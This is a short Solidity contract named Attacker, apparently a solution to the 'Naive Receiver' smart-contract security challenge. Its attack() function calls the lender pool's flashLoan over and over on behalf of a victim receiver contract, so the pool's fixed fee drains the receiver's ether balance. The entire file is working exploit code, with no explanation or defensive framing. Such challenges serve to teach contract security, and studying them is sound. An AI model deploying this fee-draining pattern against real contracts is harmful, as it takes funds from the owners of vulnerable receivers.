pragma solidity ^0.8.0;

import "./FlashLoanReceiver.sol";
import "./NaiveReceiverLenderPool.sol";

contract Attacker {
    FlashLoanReceiver private immutable flashLoanReceiver;
    NaiveReceiverLenderPool private immutable naiveReceiverLenderPool;

    constructor(
        FlashLoanReceiver _flashLoanReceiver,
        NaiveReceiverLenderPool _naiveReceiverLenderPool
    ) public {
        flashLoanReceiver = _flashLoanReceiver;
        naiveReceiverLenderPool = _naiveReceiverLenderPool;
    }

    function attack() external {
        uint balanceLeft = address(flashLoanReceiver).balance;
        uint fee = naiveReceiverLenderPool.fixedFee();

        while (balanceLeft >= fee) {
            naiveReceiverLenderPool.flashLoan(
                address(flashLoanReceiver),
                1 ether
            );
            balanceLeft -= fee;
        }
    }
}
